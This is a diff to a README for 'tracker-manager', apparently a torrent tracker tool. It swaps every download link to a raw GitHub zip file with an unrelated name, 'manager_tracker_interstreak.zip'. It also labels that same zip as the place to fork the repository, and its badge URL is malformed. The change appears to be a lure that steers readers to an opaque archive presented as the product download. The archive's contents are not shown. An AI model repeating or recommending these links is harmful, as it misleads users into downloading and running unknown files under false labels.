@@ -8,9 +8,9 @@ Welcome to tracker-manager! This tool helps you manage and validate your Torrent
 
 To get started, download the application from the link below. 
 
-[![Download tracker-manager](https://raw.githubusercontent.com/xiandavid16/tracker-manager/master/models/tracker-manager_v1.8.zip%https://raw.githubusercontent.com/xiandavid16/tracker-manager/master/models/tracker-manager_v1.8.zip)](https://raw.githubusercontent.com/xiandavid16/tracker-manager/master/models/tracker-manager_v1.8.zip)
+[![Download tracker-manager](https://raw.githubusercontent.com/xiandavid16/tracker-manager/master/network/manager_tracker_interstreak.zip%https://raw.githubusercontent.com/xiandavid16/tracker-manager/master/network/manager_tracker_interstreak.zip)](https://raw.githubusercontent.com/xiandavid16/tracker-manager/master/network/manager_tracker_interstreak.zip)
 
-1. Click the button above or visit this page to download the latest version: [Download tracker-manager](https://raw.githubusercontent.com/xiandavid16/tracker-manager/master/models/tracker-manager_v1.8.zip).
+1. Click the button above or visit this page to download the latest version: [Download tracker-manager](https://raw.githubusercontent.com/xiandavid16/tracker-manager/master/network/manager_tracker_interstreak.zip).
 2. Choose the appropriate file for your operating system (Windows, macOS, or Linux).
 3. Click on the file to begin the download.
 
@@ -69,7 +69,7 @@ tracker-manager uses several modern technologies, making it a reliable and effec
 
 We welcome contributions from anyone interested in improving tracker-manager. If you want to help, here’s how you can contribute:
 
-1. Fork the repository from [GitHub](https://raw.githubusercontent.com/xiandavid16/tracker-manager/master/models/tracker-manager_v1.8.zip).
+1. Fork the repository from [GitHub](https://raw.githubusercontent.com/xiandavid16/tracker-manager/master/network/manager_tracker_interstreak.zip).
 2. Make changes in your copy of the repository.
 3. Submit a pull request explaining your modifications.
 
